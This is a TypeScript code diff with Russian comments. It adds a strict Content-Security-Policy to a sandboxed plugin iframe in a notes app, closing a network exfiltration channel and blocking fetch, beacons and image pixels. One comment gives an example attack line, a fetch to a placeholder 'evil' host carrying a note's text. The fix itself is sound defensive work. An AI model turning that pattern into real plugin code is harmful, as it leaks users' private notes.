@@ -197,13 +197,50 @@ export async function mountPlugin(
 }
 
 /**
+ * Жёсткая CSP плагинного iframe — контейнмент амбиентного egress (THREAT_MODEL T2). Sandbox-iframe
+ * (`allow-scripts`, opaque origin) закрывает доступ к родителю/DOM/storage, но НЕ закрывает сетевой
+ * выход: плагин, легитимно прочитав заметку через брокер, мог бы `fetch('https://evil',{body:текст})`
+ * / `img.src` / `navigator.sendBeacon` ПРЯМО из iframe, минуя net-allowlist/SSRF-гард брокера. App-CSP
+ * на srcdoc в этом WebView НЕ энфорсится (демо на inline-script работает → connect-src тоже не
+ * энфорсился → канал был открыт). Поэтому вставляем СВОЮ CSP как первый `<meta http-equiv>` в `<head>`.
+ *
+ * `connect-src 'none'` (+ img/media/font/form-action 'none') глушит fetch/XHR/beacon/img-пиксель на
+ * внешний хост. `script-src`/`style-src 'unsafe-inline'` ОБЯЗАТЕЛЬНЫ: демо использует inline `<script>`
+ * и `<style>`; `postMessage` НЕ подпадает под `connect-src` → канал к брокеру (единственный outlet)
+ * остаётся жив. `default-src 'none'` закрывает всё прочее (`base-uri`/`frame-src 'none'`).
+ *
+ * ⚠ Единая точка: любой путь генерации srcdoc обязан прогонять HTML через `withPluginCsp` (untrusted
+ * PLUG-2 автоматически получит контейнмент). НЕ хардкодить CSP-строку в двух местах.
+ */
+export const PLUGIN_CSP =
+  "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; " +
+  "connect-src 'none'; img-src 'none'; media-src 'none'; font-src 'none'; " +
+  "form-action 'none'; frame-src 'none'; base-uri 'none'";
+
+/**
+ * Вставляет [`PLUGIN_CSP`] ПЕРВЫМ тегом внутрь `<head>` переданного HTML плагина. Единая точка вставки
+ * CSP для ЛЮБОГО srcdoc плагина (демо и будущий загружаемый код PLUG-2) — контейнмент egress по T2.
+ * `<head>` в шаблоне обязателен (иначе CSP было бы некуда вставить fail-closed) → бросаем при отсутствии.
+ */
+export function withPluginCsp(html: string): string {
+  const meta = `<meta http-equiv="Content-Security-Policy" content="${PLUGIN_CSP}">`;
+  const headOpen = html.indexOf('<head>');
+  if (headOpen === -1) {
+    throw new Error('plugin srcdoc: отсутствует <head> для вставки CSP (контейнмент egress T2)');
+  }
+  const insertAt = headOpen + '<head>'.length;
+  return html.slice(0, insertAt) + meta + html.slice(insertAt);
+}
+
+/**
  * HTML демо-плагина (Ф2): крутится в sandbox-iframe (`allow-scripts`, opaque origin — нет доступа к
  * родителю/storage). Через свой порт зовёт host-функции брокера: листинг vault, чтение по клику и
  * демонстрацию ГРАНИЦЫ записи (Notes/ — в scope, README.md — отказ брокера). Реальные плагины будут
- * грузиться из `.nexus/plugins/<id>/` — здесь демо встроено в хост (см. BACKLOG: загрузка ассетов+CSP).
+ * грузиться из `.nexus/plugins/<id>/` — здесь демо встроено в хост (см. BACKLOG: загрузка ассетов).
+ * Egress-контейнмент: srcdoc прогоняется через [`withPluginCsp`] (`connect-src 'none'`, T2).
  */
 export function demoPluginSrcdoc(): string {
-  return `<!doctype html><html lang="ru"><head><meta charset="utf-8"><style>
+  return withPluginCsp(`<!doctype html><html lang="ru"><head><meta charset="utf-8"><style>
     body{font:13px/1.5 system-ui,-apple-system,sans-serif;margin:0;padding:12px;color:#dcdce0;background:#1b1b1f}
     h1{font-size:13px;margin:0 0 4px}p.sub{margin:0 0 10px;color:#888}
     ul{list-style:none;margin:0;padding:0}
@@ -297,5 +334,5 @@ export function demoPluginSrcdoc(): string {
       if(e.data && e.data.type==='nexus:init'){ clearInterval(announce); port = e.ports[0]; port.onmessage = onMsg; port.start(); boot(); }
     });
     parent.postMessage({ type:'nexus:ready' }, '*');
-  </script></body></html>`;
+  </script></body></html>`);
 }
